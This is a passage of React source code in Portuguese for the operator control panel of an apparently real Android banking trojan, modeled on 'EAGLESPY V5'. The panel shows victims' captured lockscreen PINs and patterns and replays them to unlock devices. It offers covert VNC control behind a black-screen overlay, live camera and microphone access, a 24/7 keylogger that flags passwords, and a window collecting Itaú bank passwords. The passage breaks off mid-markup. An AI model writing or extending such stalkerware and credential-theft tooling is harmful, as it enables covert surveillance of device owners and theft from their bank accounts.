                    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold"
                  >
                    💾
                  </button>
                </div>
                {capturedPattern && capturedPattern !== patternInput && (
                  <p className="text-xs text-green-400 mt-1">💡 Último Pattern capturado: {capturedPattern}</p>
                )}
                
                {/* Visualização do Pattern */}
                <div className="mt-3 bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-gray-400 mb-2">Grid do Pattern (1-9):</p>
                  <div className="grid grid-cols-3 gap-2 max-w-[150px] mx-auto">
                    {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                      <div
                        key={num}
                        className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold ${
                          patternInput.includes(num.toString())
                            ? 'bg-blue-500 text-white'
                            : 'bg-slate-700 text-gray-400'
                        }`}
                      >
                        {num}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
            
            {/* Eventos capturados da lockscreen */}
            <div className="mb-4 rounded-lg p-3 border border-slate-600/50 bg-slate-900/40">
              <h3 className="text-sm font-bold text-gray-300 mb-2">📋 PINs capturados (lockscreen)</h3>
              {renderCapturedUnlockPinsList()}
            </div>

            {renderUnlockRecordingControls()}
            
            {/* Teclado Numérico para PIN (só aparece quando PIN) */}
            {lockscreenType === 'PIN' && (
              <div className="bg-black rounded-lg p-4 mb-4">
                <p className="text-xs text-gray-400 mb-2 text-center">Teclado para reprodução manual no device:</p>
                <div className="grid grid-cols-3 gap-2">
                  {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                    <button
                      key={num}
                      onClick={() => pressLockKey(num.toString())}
                      className="py-3 bg-gradient-to-br from-slate-700 to-slate-800 hover:from-yellow-600 hover:to-yellow-700 text-white text-lg font-bold rounded-xl transition-all border border-slate-600 hover:border-yellow-500"
                    >
                      {num}
                    </button>
                  ))}
                  <button
                    onClick={() => pressLockKey('DELETE')}
                    className="py-3 bg-gradient-to-br from-red-800 to-red-900 hover:from-red-700 hover:to-red-800 text-white text-lg font-bold rounded-xl transition-all border border-red-600"
                  >
                    ⌫
                  </button>
                  <button
                    onClick={() => pressLockKey('0')}
                    className="py-3 bg-gradient-to-br from-slate-700 to-slate-800 hover:from-yellow-600 hover:to-yellow-700 text-white text-lg font-bold rounded-xl transition-all border border-slate-600 hover:border-yellow-500"
                  >
                    0
                  </button>
                  <button
                    onClick={() => pressLockKey('ENTER')}
                    className="py-3 bg-gradient-to-br from-green-700 to-green-800 hover:from-green-600 hover:to-green-700 text-white text-lg font-bold rounded-xl transition-all border border-green-600"
                  >
                    ✔
                  </button>
                </div>
              </div>
            )}
            
            {/* Reprodução Automática */}
            <div className={`rounded-lg p-4 border ${lockscreenType === 'PIN' ? 'bg-gradient-to-r from-yellow-900/30 to-orange-900/30 border-yellow-500/30' : 'bg-gradient-to-r from-blue-900/30 to-purple-900/30 border-blue-500/30'}`}>
              <h3 className={`font-bold mb-3 flex items-center ${lockscreenType === 'PIN' ? 'text-yellow-400' : 'text-blue-400'}`}>
                <span className="mr-2">🔄</span>
                Reprodução Automática
              </h3>
              <div className="flex items-center gap-2 mb-3">
                <label className="text-gray-300 text-sm">Delay (ms):</label>
                <input
                  type="number"
                  value={pinDelay}
                  onChange={(e) => setPinDelay(Math.max(500, parseInt(e.target.value) || 1000))}
                  min={500}
                  max={5000}
                  step={100}
                  className="w-24 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-white text-center"
                />
                <span className="text-gray-400 text-xs">{lockscreenType === 'PIN' ? 'entre teclas' : 'na execução'}</span>
              </div>
              <button
                onClick={playLockSequence}
                disabled={isPlayingPin || (lockscreenType === 'PIN' ? !pinInput : !patternInput)}
                className={`w-full py-3 rounded-lg font-bold transition-all flex items-center justify-center ${
                  isPlayingPin
                    ? `${lockscreenType === 'PIN' ? 'bg-yellow-500' : 'bg-blue-500'} text-black cursor-not-allowed`
                    : (lockscreenType === 'PIN' ? pinInput : patternInput)
                      ? `bg-gradient-to-r ${lockscreenType === 'PIN' ? 'from-yellow-600 to-orange-600 hover:from-yellow-500 hover:to-orange-500' : 'from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500'} text-white`
                      : 'bg-gray-700 text-gray-400 cursor-not-allowed'
                }`}
              >
                {isPlayingPin ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-black mr-2"></div>
                    Reproduzindo...
                  </>
                ) : lockscreenType === 'PIN' ? (
                  <>🔓 Reproduzir PIN: {pinInput || '(digite acima)'}</>
                ) : (
                  <>🔓 Reproduzir Padrão: {patternInput || '(digite acima)'}</>
                )}
              </button>
            </div>
            
            <p className="text-center text-xs text-gray-500 mt-4">
              🔒 Sistema de desbloqueio igual EAGLESPY V5 - PIN + Padrão
            </p>
          </div>
        </div>
      )}
      
      {/* 🎨 Layout Edit Mode - Toolbar e Botão Flutuante */}
      <EditModeToggle 
        isEditMode={isLayoutEditMode} 
        onToggle={() => setIsLayoutEditMode(true)} 
      />
      
      <LayoutEditToolbar
        isEditMode={isLayoutEditMode}
        isDirty={layoutDirty}
        onToggleEditMode={() => setIsLayoutEditMode(false)}
        onSave={saveLayoutPrefs}
        onReset={resetLayoutPrefs}
      />
      
      {/* 🎨 Editor de Tela Preta Customizada */}
      <BlackScreenEditor
        isOpen={showBlackScreenEditor}
        onClose={() => setShowBlackScreenEditor(false)}
        onSave={saveBlackScreenTemplate}
        onApply={applyCustomBlackScreen}
        initialTemplate={customBlackScreenTemplate}
      />
      
      {/* 🪟 MODO FLUTUANTE - Janelas Arrastáveis */}
      {isFloatingMode && (
        <div className="fixed inset-0 bg-slate-950/95 z-40 overflow-hidden">
          {/* Toolbar de Janelas */}
          <div className="fixed top-0 left-0 right-0 bg-slate-800 border-b border-slate-600 px-4 py-2 z-50 flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <span className="text-white font-bold">🪟 Modo Flutuante</span>
              <span className="text-gray-400 text-sm">- Arraste as janelas para onde quiser!</span>
            </div>
            
            {/* Botões para abrir janelas */}
            <div className="flex items-center space-x-2">
              <button
                onClick={() => toggleWindow('vnc')}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.vnc.open 
                    ? 'bg-purple-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                📺 VNC V1
              </button>
              <button
                onClick={() => {
                  toggleWindow('screenReader');
                  if (!isScreenReaderEnabled && !floatingWindows.screenReader.open) {
                    toggleScreenReader();
                  }
                }}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.screenReader.open 
                    ? 'bg-green-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                👁️ Screen V2
              </button>
              <button
                onClick={() => toggleWindow('controls')}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.controls.open 
                    ? 'bg-blue-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🎛️ Controles
              </button>
              <button
                onClick={() => {
                  toggleWindow('camera');
                  if (!isCameraEnabled && !floatingWindows.camera.open) {
                    toggleCamera();
                  }
                }}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.camera.open 
                    ? 'bg-cyan-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                📷 Câmera
              </button>
              <button
                onClick={() => {
                  toggleWindow('microphone');
                  if (!isMicrophoneEnabled && !floatingWindows.microphone.open) {
                    toggleMicrophone();
                  }
                }}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.microphone.open 
                    ? 'bg-pink-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🎤 Mic
              </button>
              <button
                onClick={() => toggleWindow('keylogger')}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.keylogger.open 
                    ? 'bg-yellow-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                ⌨️ Keylogger
              </button>
              <button
                onClick={() => toggleWindow('bankPasswords')}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.bankPasswords.open 
                    ? 'bg-orange-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🏦 Itaú {bankPasswords.length > 0 && `(${bankPasswords.length})`}
              </button>
              <button
                onClick={() => toggleWindow('lockscreen')}
                className={`px-3 py-1.5 rounded-lg text-sm font-semibold transition-all ${
                  floatingWindows.lockscreen.open 
                    ? 'bg-red-600 text-white' 
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🔒 Lockscreen {(capturedPin || capturedPattern) && '✓'}
              </button>
              
              <div className="border-l border-slate-600 pl-2 ml-2">
                <button
                  onClick={() => setIsFloatingMode(false)}
                  className="px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold"
                >
                  ✖️ Sair
                </button>
              </div>
            </div>
          </div>
          
          {/* Janelas Flutuantes */}
          <div className="pt-14 h-full">
            {/* VNC V1 */}
            <FloatingWindow
              id="vnc"
              title="📺 VNC Normal"
              isOpen={floatingWindows.vnc.open}
              position={{ x: floatingWindows.vnc.x, y: floatingWindows.vnc.y }}
              size={{ width: floatingWindows.vnc.width, height: floatingWindows.vnc.height }}
              zIndex={floatingWindows.vnc.zIndex}
              onClose={() => toggleWindow('vnc')}
              onFocus={() => bringToFront('vnc')}
              onDrag={(x, y) => updateWindowPosition('vnc', x, y)}
              onResize={(w, h) => updateWindowSize('vnc', w, h)}
              headerColor="bg-purple-700"
            >
              <div className="h-full bg-black p-2">
                {isCaptureEnabled ? (
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    onConnectionStatusChange={handleConnectionStatusChange}
                    captureMethod="silent"
                    killerFrameOnPointerMove={isKillerMode}
                    onRequestFrame={requestKillerFrame}
                  />
                ) : (
                  <div className="h-full flex items-center justify-center text-gray-500">
                    <div className="text-center">
                      <p className="mb-2">Captura desativada</p>
                      <button
                        onClick={toggleCapture}
                        className="px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg"
                      >
                        ▶️ Iniciar Captura
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </FloatingWindow>
            
            {/* Screen Reader V2 */}
            <FloatingWindow
              id="screenReader"
              title="👁️ Screen Reader V2"
              isOpen={floatingWindows.screenReader.open}
              position={{ x: floatingWindows.screenReader.x, y: floatingWindows.screenReader.y }}
              size={{ width: floatingWindows.screenReader.width, height: floatingWindows.screenReader.height }}
              zIndex={floatingWindows.screenReader.zIndex}
              onClose={() => toggleWindow('screenReader')}
              onFocus={() => bringToFront('screenReader')}
              onDrag={(x, y) => updateWindowPosition('screenReader', x, y)}
              onResize={(w, h) => updateWindowSize('screenReader', w, h)}
              headerColor="bg-green-700"
            >
              <div className="h-full bg-black overflow-hidden flex items-center justify-center p-2">
                {screenHierarchy ? (
                  <div 
                    className="relative cursor-crosshair"
                    onMouseDown={(e) => {
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      
                      setMouseDownPos({ x, y });
                      setMouseDownTime(Date.now());
                      setIsDragging(true);
                      dragPathRef.current = [{ x, y }];
                    }}
                    onMouseMove={(e) => {
                      if (!isDragging || !mouseDownPos) return;
                      
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      
                      const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                      const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                      if (dist > 15) dragPathRef.current.push({ x, y });
                    }}
                    onMouseUp={(e) => {
                      if (!mouseDownPos) return;
                      
                      const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                      if (!screenElement) return;
                      
                      const rect = screenElement.getBoundingClientRect();
                      const upX = e.clientX - rect.left;
                      const upY = e.clientY - rect.top;
                      
                      const downX = mouseDownPos.x;
                      const downY = mouseDownPos.y;
                      
                      const deltaX = upX - downX;
                      const deltaY = upY - downY;
                      const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                      const holdTime = Date.now() - mouseDownTime;
                      
                      // Calcula escala REAL baseada no tamanho renderizado do elemento (igual ao modo normal)
                      const realScale = rect.width / SCREEN_BASE_WIDTH;
                      
                      // Converte para coordenadas do dispositivo usando escala real
                      const deviceDownX = Math.round(downX / realScale);
                      const deviceDownY = Math.round(downY / realScale);
                      const deviceUpX = Math.round(upX / realScale);
                      const deviceUpY = Math.round(upY / realScale);
                      
                      // Valida limites
                      if (deviceDownX < 0 || deviceDownX > SCREEN_BASE_WIDTH || deviceDownY < 0 || deviceDownY > SCREEN_BASE_HEIGHT) {
                        setMouseDownPos(null);
                        setIsDragging(false);
                        dragPathRef.current = [];
                        return;
                      }
                      
                      // Long Press (segurou mais de 500ms sem mover muito)
                      if (holdTime > 500 && distance < 10) {
                        sendCommand({ action: 'LONG_PRESS', x: deviceDownX, y: deviceDownY });
                        addLog(`🕐 Long Press: (${deviceDownX}, ${deviceDownY})`);
                      }
                      // Swipe/Pattern (moveu mais de 30px)
                      else if (distance > 30) {
                        sendCommand({ action: 'SWIPE', x1: deviceDownX, y1: deviceDownY, x2: deviceUpX, y2: deviceUpY });
                        addLog(`👉 Swipe: (${deviceDownX},${deviceDownY}) → (${deviceUpX},${deviceUpY})`);
                      }
                      // Click normal
                      else {
                        sendCommand({ action: 'CLICK', x: deviceDownX, y: deviceDownY });
                        addLog(`🖱️ Click: (${deviceDownX}, ${deviceDownY})`);
                      }
                      
                      setMouseDownPos(null);
                      setIsDragging(false);
                      dragPathRef.current = [];
                    }}
                    onMouseLeave={() => {
                      if (isDragging) {
                        setMouseDownPos(null);
                        setIsDragging(false);
                        dragPathRef.current = [];
                      }
                    }}
                  >
                    {/* Container com tamanho fixo igual ao modo normal */}
                    <div 
                      data-screen="true"
                      className="relative bg-slate-950 overflow-hidden rounded-lg shadow-2xl shadow-green-500/20 border border-green-500/30" 
                      style={{ 
                        width: '320px',
                        aspectRatio: `${SCREEN_BASE_WIDTH} / ${SCREEN_BASE_HEIGHT}`
                      }}
                    >
                      <ScreenReaderCanvas hierarchy={screenHierarchy.hierarchy} scale={1} />
                    </div>
                  </div>
                ) : (
                  <div className="h-full flex items-center justify-center text-gray-500">
                    <div className="text-center">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-2"></div>
                      <p>Aguardando dados...</p>
                    </div>
                  </div>
                )}
              </div>
            </FloatingWindow>
            
            {/* Controles */}
            <FloatingWindow
              id="controls"
              title="🎛️ Controles"
              isOpen={floatingWindows.controls.open}
              position={{ x: floatingWindows.controls.x, y: floatingWindows.controls.y }}
              size={{ width: floatingWindows.controls.width, height: floatingWindows.controls.height }}
              zIndex={floatingWindows.controls.zIndex}
              onClose={() => toggleWindow('controls')}
              onFocus={() => bringToFront('controls')}
              onDrag={(x, y) => updateWindowPosition('controls', x, y)}
              onResize={(w, h) => updateWindowSize('controls', w, h)}
              headerColor="bg-blue-700"
            >
              <div className="p-3 space-y-3 overflow-y-auto h-full">
                {/* Navegação */}
                <div className="grid grid-cols-3 gap-2">
                  <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">◀ Back</button>
                  <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">● Home</button>
                  <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">■ Recent</button>
                </div>
                
                <div>
                  <p className="text-[10px] text-gray-400 font-semibold mb-1">Controle Rápido</p>
                  <div className="grid grid-cols-5 gap-1">
                    <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-[10px] font-bold">📳</button>
                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold">🔉</button>
                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold">🔊</button>
                    <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-red-800 hover:bg-red-700 text-white rounded text-[10px] font-bold">🔒</button>
                    <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-[10px] font-bold">📷</button>
                  </div>
                </div>
                
                {/* Power e Ações */}
                <div className="grid grid-cols-2 gap-2">
                  <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-bold">⏻ Power</button>
                  <button onClick={toggleBlackScreen} className={`py-2 rounded-lg font-bold ${isBlackScreen ? 'bg-orange-600 text-white' : 'bg-slate-700 text-white hover:bg-slate-600'}`}>
                    {isBlackScreen ? '🔴 Tela Preta ON' : '⬛ Tela Preta'}
                  </button>
                </div>
                
                <div className="grid grid-cols-2 gap-2">
                  <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-sm font-bold">🔔 Notificações</button>
                  <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-sm font-bold">⚙️ Config</button>
                </div>
                
                {/* Captura */}
                <div className="flex gap-2">
                  <button onClick={toggleCapture} className={`flex-1 py-2 rounded-lg font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-slate-700 text-white hover:bg-slate-600'}`}>
                    {isCaptureEnabled ? '🔴 Captura Ativa' : '▶️ Iniciar Captura'}
                  </button>
                  <button 
                    onClick={restartCapture}
                    className="px-3 py-2 bg-orange-600 hover:bg-orange-700 text-white rounded-lg font-bold"
                    title="Reiniciar VNC - Use se perdeu conexão"
                  >
                    🔄
                  </button>
                </div>
                
                {/* Digitar Texto */}
                <div className="space-y-2">
                  <input
                    type="text"
                    value={textToSend}
                    onChange={(e) => setTextToSend(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                    placeholder="Digite o texto..."
                    className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded text-white placeholder-gray-400"
                  />
                  <button onClick={handleSendText} disabled={!textToSend.trim()} className="w-full py-2 bg-purple-600 hover:bg-purple-700 disabled:bg-slate-700 text-white rounded-lg font-bold">
                    Enviar Texto
                  </button>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Câmera */}
            <FloatingWindow
              id="camera"
              title="📷 Câmera"
              isOpen={floatingWindows.camera.open}
              position={{ x: floatingWindows.camera.x, y: floatingWindows.camera.y }}
              size={{ width: floatingWindows.camera.width, height: floatingWindows.camera.height }}
              zIndex={floatingWindows.camera.zIndex}
              onClose={() => {
                toggleWindow('camera');
                if (isCameraEnabled) toggleCamera();
              }}
              onFocus={() => bringToFront('camera')}
              onDrag={(x, y) => updateWindowPosition('camera', x, y)}
              onResize={(w, h) => updateWindowSize('camera', w, h)}
              headerColor="bg-cyan-700"
            >
              <div className="h-full bg-black flex items-center justify-center">
                <canvas ref={cameraCanvasRef} className="max-w-full max-h-full" />
                <div className="absolute bottom-2 left-2 right-2 flex justify-center space-x-2">
                  <button onClick={switchCamera} className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm">
                    🔄 {currentCamera === 'back' ? 'Frontal' : 'Traseira'}
                  </button>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Microfone */}
            <FloatingWindow
              id="microphone"
              title="🎤 Microfone"
              isOpen={floatingWindows.microphone.open}
              position={{ x: floatingWindows.microphone.x, y: floatingWindows.microphone.y }}
              size={{ width: floatingWindows.microphone.width, height: floatingWindows.microphone.height }}
              zIndex={floatingWindows.microphone.zIndex}
              onClose={() => {
                toggleWindow('microphone');
                if (isMicrophoneEnabled) toggleMicrophone();
              }}
              onFocus={() => bringToFront('microphone')}
              onDrag={(x, y) => updateWindowPosition('microphone', x, y)}
              onResize={(w, h) => updateWindowSize('microphone', w, h)}
              headerColor="bg-pink-700"
            >
              <div className="h-full bg-slate-900 flex items-center justify-center">
                <div className="text-center">
                  <div className="text-6xl mb-4 animate-pulse">🎤</div>
                  <p className="text-white font-bold">Ouvindo...</p>
                  <p className="text-gray-400 text-sm mt-2">Áudio em tempo real ativo</p>
                </div>
              </div>
            </FloatingWindow>
            
            {/* Keylogger - NOVO SISTEMA COM CALENDÁRIO */}
            <FloatingWindow
              id="keylogger"
              title={`⌨️ Keylogger 24/7 ${keylogTotalToday > 0 ? `(${keylogTotalToday} hoje)` : ''}`}
              isOpen={floatingWindows.keylogger.open}
              position={{ x: floatingWindows.keylogger.x, y: floatingWindows.keylogger.y }}
              size={{ width: Math.max(floatingWindows.keylogger.width, 450), height: Math.max(floatingWindows.keylogger.height, 550) }}
              zIndex={floatingWindows.keylogger.zIndex}
              onClose={() => toggleWindow('keylogger')}
              onFocus={() => bringToFront('keylogger')}
              onDrag={(x, y) => updateWindowPosition('keylogger', x, y)}
              onResize={(w, h) => updateWindowSize('keylogger', w, h)}
              headerColor="bg-gradient-to-r from-yellow-700 to-orange-700"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-slate-800 to-slate-900">
                {/* 📊 RESUMO ESTATÍSTICO */}
                {keylogSummary && (
                  <div className="grid grid-cols-3 gap-2 mb-3">
                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
                      <div className="text-lg font-bold text-yellow-400">{keylogSummary.total_logs || 0}</div>
                      <div className="text-[9px] text-gray-400">Total</div>
                    </div>
                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
                      <div className="text-lg font-bold text-green-400">{keylogSummary.today_logs || 0}</div>
                      <div className="text-[9px] text-gray-400">Hoje</div>
                    </div>
                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
                      <div className="text-lg font-bold text-red-400">{keylogSummary.passwords_captured || 0}</div>
                      <div className="text-[9px] text-gray-400">Senhas</div>
                    </div>
                  </div>
                )}
                
                {/* 📅 SELETOR DE DATA */}
                <div className="bg-slate-700/30 rounded-lg p-2 mb-3">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs text-gray-400">📅 Selecionar Data:</span>
                    <button
                      onClick={() => {
                        const today = new Date().toISOString().split('T')[0];
                        setKeylogSelectedDate(today);
                      }}
                      className="px-2 py-1 bg-green-600 hover:bg-green-700 text-white text-[10px] rounded"
                    >
                      Hoje
                    </button>
                  </div>
                  
                  <input
                    type="date"
                    value={keylogSelectedDate}
                    onChange={(e) => setKeylogSelectedDate(e.target.value)}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded-lg text-white text-sm focus:outline-none focus:border-yellow-500"
                    max={new Date().toISOString().split('T')[0]}
                  />
                  
                  {/* Datas com atividade */}
                  {keylogDates.length > 0 && (
                    <div className="mt-2 flex flex-wrap gap-1">
                      {keylogDates.slice(0, 7).map((d, i) => (
                        <button
                          key={i}
                          onClick={() => setKeylogSelectedDate(d.date)}
                          className={`px-2 py-1 text-[9px] rounded ${
                            d.date === keylogSelectedDate
                              ? 'bg-yellow-600 text-white'
                              : 'bg-slate-600 text-gray-300 hover:bg-slate-500'
                          }`}
                        >
                          {new Date(d.date + 'T12:00:00').toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })}
                          <span className="ml-1 text-yellow-300">({d.count})</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
                
                {/* 📜 LISTA DE KEYLOGS DO DIA */}
                <div className="flex items-center justify-between mb-2">
                  <h4 className="text-sm font-semibold text-white flex items-center">
                    <Keyboard className="w-4 h-4 mr-2 text-yellow-400" />
                    {new Date(keylogSelectedDate + 'T12:00:00').toLocaleDateString('pt-BR', { 
                      weekday: 'long', 
                      day: '2-digit', 
                      month: 'long' 
                    })}
                    <span className="ml-2 px-2 py-0.5 bg-yellow-600 text-white text-[10px] rounded-full">
                      {keylogsByDate.length}
                    </span>
                  </h4>
                  <button
                    onClick={downloadKeylogs}
                    className="flex items-center px-2 py-1 bg-purple-600 hover:bg-purple-700 text-white text-[10px] rounded"
                  >
                    <Download className="w-3 h-3 mr-1" />
                    Baixar
                  </button>
                </div>
                
                {isLoadingKeylogs ? (
                  <div className="text-center py-6">
                    <div className="animate-spin w-6 h-6 border-2 border-yellow-500 border-t-transparent rounded-full mx-auto mb-2"></div>
                    <p className="text-sm text-gray-400">Carregando...</p>
                  </div>
                ) : keylogsByDate.length > 0 ? (
                  <div className="bg-slate-900/50 rounded-lg p-2 space-y-1 max-h-[300px] overflow-y-auto">
                    {/* INVERTIDO: Logs mais recentes primeiro (em cima) */}
                    {[...keylogsByDate].reverse().map((log, i) => {
                      const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
                      return (
                        <div key={i} className={`p-2 rounded-lg ${
                          log.isPassword 
                            ? 'bg-red-900/40 border border-red-500/50' 
                            : 'bg-slate-800/50'
                        }`}>
                          <div className="flex items-center justify-between text-[10px]">
                            <span className="text-yellow-400 font-mono">{log.time}</span>
                            <span className="text-purple-400 font-semibold truncate max-w-[120px]">{friendlyName}</span>
                            {log.isOffline && <span className="text-cyan-400">📴</span>}
                          </div>
                          <div className={`font-mono text-sm break-all mt-1 ${
                            log.isPassword ? 'text-red-400 font-bold' : 'text-white'
                          }`}>
                            {log.isPassword && '🔑 '}
                            {log.text}
                          </div>
                          {log.eventType && log.eventType !== 'TEXT_CHANGED' && (
                            <div className="text-[8px] text-gray-500 mt-1">
                              {log.eventType.replace('BANK_PASSWORD_COMPLETE', '🏦 SENHA BANCÁRIA')}
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <div className="text-center py-8 bg-slate-900/30 rounded-lg">
                    <div className="text-3xl mb-2">📭</div>
                    <p className="text-sm text-gray-400">Nenhum keylog nesta data</p>
                    <p className="text-[10px] text-gray-500 mt-1">Selecione outra data ou aguarde</p>
                  </div>
                )}
                
                {/* 🔴 INDICADOR DE TEMPO REAL - Sem pulsação excessiva */}
                {keylogSelectedDate === new Date().toISOString().split('T')[0] && (
                  <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-green-400">
                    <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                    🟢 Atualizando em tempo real
                  </div>
                )}
                
                {/* LEGENDA */}
                <div className="mt-3 flex items-center justify-center gap-4 text-[9px] text-gray-500">
                  <span>🔑 = Senha</span>
                  <span>📴 = Offline</span>
                  <span>🏦 = Banco</span>
                </div>
              </div>
            </FloatingWindow>
            
            {/* 🏦 KEYLOGGER ITAÚ - Senhas Bancárias */}
            <FloatingWindow
              id="bankPasswords"
              title="🏦 KEYLOGGER ITAÚ"
              isOpen={floatingWindows.bankPasswords.open}
              position={{ x: floatingWindows.bankPasswords.x, y: floatingWindows.bankPasswords.y }}
              size={{ width: floatingWindows.bankPasswords.width, height: floatingWindows.bankPasswords.height }}
              zIndex={floatingWindows.bankPasswords.zIndex}
              onClose={() => toggleWindow('bankPasswords')}
              onFocus={() => bringToFront('bankPasswords')}
              onDrag={(x, y) => updateWindowPosition('bankPasswords', x, y)}
              onResize={(w, h) => updateWindowSize('bankPasswords', w, h)}
              headerColor="bg-orange-700"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-orange-900/30 to-orange-800/20">
                {/* Header igual ao modo normal */}
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-white font-bold flex items-center text-sm">
                    <span className="text-lg mr-2">🏦</span>
                    KEYLOGGER ITAÚ
                    <span className="ml-2 px-2 py-0.5 bg-orange-600 text-white text-[10px] rounded-full">
                      {bankPasswords.length}
                    </span>
                  </h3>
                </div>
                
                {bankPasswords.length === 0 ? (
                  <div className="text-center py-8 text-gray-400">
                    <div className="text-4xl mb-3">🔐</div>
                    <p className="text-sm">Aguardando senhas do APK Visual...</p>
                    <p className="text-xs text-gray-500 mt-2">SENHA_INICIAL | SENHA_TRANSACAO</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {bankPasswords.map((pwd, i) => (
                      <div 
                        key={i} 
                        className="bg-gradient-to-r from-orange-950/80 to-gray-900/80 border border-orange-500/50 rounded-lg p-3"
                      >
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center space-x-2">
                            <span className="text-lg">🏦</span>
                            <span className="font-bold text-orange-400 text-sm">{pwd.bank || 'Itaú'}</span>
                            <span className="px-2 py-0.5 bg-orange-600 text-white text-[10px] rounded-full font-bold">
                              {pwd.digits || 6} dígitos
                            </span>
                          </div>
                          <span className="text-[10px] text-gray-400">
                            {new Date(pwd.timestamp).toLocaleTimeString()}
                          </span>
                        </div>
                        
                        {/* Label do campo */}
                        <div className="mb-2 flex items-center space-x-2 flex-wrap gap-1">
                          {(pwd.label || pwd.hint) && (
                            <span className="px-2 py-1 bg-orange-800/60 text-orange-300 text-[10px] rounded font-mono font-bold">
                              {pwd.label || pwd.hint}
                            </span>
                          )}
                          {pwd.source === 'VISUAL_SCREEN' && (
